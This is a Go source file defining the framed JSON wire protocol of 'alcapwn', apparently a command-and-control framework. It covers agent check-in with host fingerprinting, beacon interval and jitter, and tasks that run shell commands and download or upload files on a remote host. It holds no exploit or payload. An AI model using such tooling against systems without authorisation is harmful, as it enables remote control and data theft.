// Package proto defines the wire protocol between the alcapwn agent and server.
//
// Framing: every message is a fixed 8-byte header followed by a JSON body.
//
//	[4 bytes] magic — always 'A','L','C','A' (0x41 0x4C 0x43 0x41)
//	[4 bytes] body length, big-endian uint32
//	[N bytes] JSON-encoded Envelope
//
// The magic bytes are what acceptLoop peeks at to distinguish an agent
// connection from a raw PTY shell or TLS ClientHello.
package proto

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
)

// Magic is the 4-byte prefix that begins every agent TCP connection.
var Magic = [4]byte{'A', 'L', 'C', 'A'}

// MaxBodySize is the maximum allowed body length (4 MiB).
const MaxBodySize = 4 << 20

// MsgType is a string tag carried in every Envelope to identify its payload.
type MsgType string

const (
	MsgHello   MsgType = "hello"
	MsgWelcome MsgType = "welcome"
	MsgTask    MsgType = "task"
	MsgResult  MsgType = "result"
	MsgPing    MsgType = "ping"
	MsgPong    MsgType = "pong"
)

// Envelope is the top-level JSON object for all messages.
type Envelope struct {
	Type MsgType         `json:"type"`
	Data json.RawMessage `json:"data"`
}

// Hello is sent by the agent immediately after the TCP connection is
// established.  The server uses it to populate session metadata.
type Hello struct {
	Version   string `json:"version"`
	MachineID string `json:"machine_id"` // deterministic host fingerprint
	Hostname  string `json:"hostname"`
	OS        string `json:"os"`
	Arch      string `json:"arch"`
	User      string `json:"user"`
	UID       string `json:"uid"`
	Shell     string `json:"shell,omitempty"` // path of discovered shell; empty = built-in mini executor
}

// Welcome is sent by the server in response to Hello.
type Welcome struct {
	SessionID int    `json:"session_id"`
	Interval  int    `json:"interval"`        // suggested keep-alive / reconnect interval (s)
	Jitter    int    `json:"jitter"`          // jitter percentage (0–50)
	Token     string `json:"token,omitempty"` // HTTP beacon token; empty for TCP sessions
}

// TaskKind classifies what the agent should do.
type TaskKind string

const (
	TaskExec     TaskKind = "exec"     // run a shell command; return combined stdout+stderr
	TaskDownload TaskKind = "download" // read Path on the remote; return bytes in Output
	TaskUpload   TaskKind = "upload"   // write Data to Path on the remote
)

// Task is pushed by the server to the agent.
type Task struct {
	ID      string   `json:"id"`
	Kind    TaskKind `json:"kind"`
	Command string   `json:"command,omitempty"` // TaskExec
	Path    string   `json:"path,omitempty"`    // TaskDownload / TaskUpload
	Data    []byte   `json:"data,omitempty"`    // TaskUpload payload
}

// Result is sent by the agent after completing a Task.
type Result struct {
	TaskID string `json:"task_id"`
	Output []byte `json:"output"`
	Error  string `json:"error,omitempty"`
	Exit   int    `json:"exit"`
}

// WriteMsg serialises data as JSON, wraps it in a typed Envelope, and writes
// the full framed message (magic + length + body) to w.
func WriteMsg(w io.Writer, t MsgType, data any) error {
	payload, err := json.Marshal(data)
	if err != nil {
		return err
	}
	env := Envelope{Type: t, Data: json.RawMessage(payload)}
	body, err := json.Marshal(env)
	if err != nil {
		return err
	}
	if len(body) > MaxBodySize {
		return fmt.Errorf("proto: message too large (%d bytes)", len(body))
	}
	frame := make([]byte, 8+len(body))
	copy(frame[0:4], Magic[:])
	binary.BigEndian.PutUint32(frame[4:8], uint32(len(body)))
	copy(frame[8:], body)
	_, err = w.Write(frame)
	return err
}

// ReadMsg reads exactly one framed message from r, validates the magic header,
// and returns the decoded Envelope.
func ReadMsg(r io.Reader) (*Envelope, error) {
	header := make([]byte, 8)
	if _, err := io.ReadFull(r, header); err != nil {
		return nil, err
	}
	if [4]byte(header[0:4]) != Magic {
		return nil, fmt.Errorf("proto: bad magic %x", header[0:4])
	}
	size := binary.BigEndian.Uint32(header[4:8])
	if size > MaxBodySize {
		return nil, fmt.Errorf("proto: body too large (%d bytes)", size)
	}
	body := make([]byte, size)
	if _, err := io.ReadFull(r, body); err != nil {
		return nil, err
	}
	var env Envelope
	if err := json.Unmarshal(body, &env); err != nil {
		return nil, err
	}
	return &env, nil
}

// IsAgentHandshake reports whether buf begins with the agent protocol magic.
// buf must be at least 4 bytes long.
func IsAgentHandshake(buf []byte) bool {
	return len(buf) >= 4 &&
		buf[0] == Magic[0] && buf[1] == Magic[1] &&
		buf[2] == Magic[2] && buf[3] == Magic[3]
}
